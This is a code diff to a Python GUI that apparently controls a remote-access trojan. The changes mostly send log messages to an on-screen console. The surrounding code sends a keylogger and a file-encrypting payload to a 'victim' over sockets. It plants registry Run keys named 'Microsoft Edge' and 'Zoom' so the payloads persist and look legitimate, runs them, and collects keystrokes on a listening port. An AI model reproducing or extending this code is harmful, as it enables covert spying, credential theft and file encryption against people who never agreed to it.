@@ -589,13 +589,14 @@ class Main(MDApp):
             # Check if payload is already on the target machine
             command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
             self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             isExist = self.currConn.recv(int(recvsize)).decode()
 
             # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
-                print("Sending keylogger payload to victim.")
+                sendprompt = "\nSending keylogger payload to victim."
+                print(sendprompt)
+                self.root.ids.disruptConsoleField.text += sendprompt
 
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
@@ -616,32 +617,40 @@ class Main(MDApp):
                     totalSent = totalSent + len(bytesToSend)
                     self.currConn.send(bytesToSend)
                 f.close()
-                print("[VICTIM]: ", self.currConn.recv(1024).decode())
+                dlcomplete = str("\n[VICTIM]: " + self.currConn.recv(1024).decode())
+                print(dlcomplete)
+                self.root.ids.disruptConsoleField.text += dlcomplete
                 time.sleep(0.05)
                 # Add payload to registry to run on login
 
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                 self.currConn.send(command.encode())
-                print('Command sent to client: ', command)
+                comsent2 = str('\nCommand sent to client: '+ command)
+                print(comsent2)
+                self.root.ids.disruptConsoleField.text += comsent2
                 recvsize = self.currConn.recv(1024).decode()
                 output = self.currConn.recv(int(recvsize)).decode()
-                print('Registry add: ', output)
+                output = str('\nRegistry add: ' + output)
+                print(output)
+                self.root.ids.disruptConsoleField.text += output
 
                 # Run payload once
                 time.sleep(0.05)
                 self.currConn.send("exe_True".encode())
                 command = tpath
                 self.currConn.send(command.encode())
-                print('Command sent to client: ', command)
+                comsent3 = str('\nCommand sent to client: '+ command)
+                print(comsent3)
+                self.root.ids.disruptConsoleField.text += comsent3
                 output2 = self.currConn.recv(1024).decode()
                 time.sleep(5)
-                o1 = f"Keylogger{output2}"
+                o1 = f"\nKeylogger{output2}"
                 print(o1)
-                self.root.ids.disruptConsoleField.text = o1
+                self.root.ids.disruptConsoleField.text += o1
             else:
-                o2 = "Keylogger already installed on target machine."
+                o2 = "\nKeylogger already installed on target machine."
                 print(o2)
-                self.root.ids.disruptConsoleField.text = o2
+                self.root.ids.disruptConsoleField.text += o2
             break
 
     def KeyloggerInit(self):
@@ -653,7 +662,7 @@ class Main(MDApp):
     def Keylogger(self):
         try:
             self.exitKeyLogger.clear()
-
+            self.root.ids.disruptConsoleField.text = ''
             # Connect to keylogger on port 47620
             klserver = socket.socket()
             klserver.bind((HOST, 47620))
@@ -665,6 +674,7 @@ class Main(MDApp):
                 if not self.exitKeyLogger.isSet():
                     keys = conn.recv(1024).decode()
                     print(keys)
+                    self.root.ids.disruptConsoleField.text += str(", " + keys)
                 else:
                     break
             conn.close()
@@ -689,7 +699,9 @@ class Main(MDApp):
 
             # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
-                print("Sending encrypt file payload to victim.")
+                encprompt = "\nSending encrypt file payload to victim."
+                print(encprompt)
+                self.root.ids.disruptConsoleField.text += encprompt
 
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
@@ -710,32 +722,40 @@ class Main(MDApp):
                     totalSent = totalSent + len(bytesToSend)
                     self.currConn.send(bytesToSend)
                 f.close()
-                print("[VICTIM]: ", self.currConn.recv(1024).decode())
+                dlcomplete = str("\n[VICTIM]: "+ self.currConn.recv(1024).decode())
+                print(dlcomplete)
+                self.root.ids.disruptConsoleField.text += dlcomplete
                 time.sleep(0.05)
 
                 # Add payload to registry to run on login
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Zoom" /t REG_SZ /d "{tpath}" /f'
                 self.currConn.send(command.encode())
-                print('Command sent to client: ', command)
+                comsent = ('\nCommand sent to client: ' +  command)
+                print(comsent)
+                self.root.ids.disruptConsoleField.text += comsent
                 recvsize = self.currConn.recv(1024).decode()
                 output = self.currConn.recv(int(recvsize)).decode()
-                print('Registry add: ', output)
+                output = str('\nRegistry add: ' + output)
+                print(output)
+                self.root.ids.disruptConsoleField.text += output
 
                 # Run payload once
                 time.sleep(0.05)
                 self.currConn.send("exe_True".encode())
                 command = tpath
                 self.currConn.send(command.encode())
-                print('Command sent to client: ', command)
+                comsent2 = ('\nCommand sent to client: ' + command)
+                print(comsent2)
+                self.root.ids.disruptConsoleField.text += comsent2
                 output2 = self.currConn.recv(1024).decode()
                 time.sleep(5)
-                o1 = f"EncryptFile{output2}"
+                o1 = f"\nEncryptFile{output2}"
                 print(o1)
-                self.root.ids.disruptConsoleField.text = o1
+                self.root.ids.disruptConsoleField.text += o1
             else:
-                o2 = "EncryptFile already installed on target machine."
+                o2 = "\nEncryptFile already installed on target machine."
                 print(o2)
-                self.root.ids.disruptConsoleField.text = o2
+                self.root.ids.disruptConsoleField.text += o2
             break
 
     def DisruptionMenu(self):
@@ -755,3 +775,4 @@ class TaskKillContent(BoxLayout):
 
 if __name__ == '__main__':
     Main().run()
+  
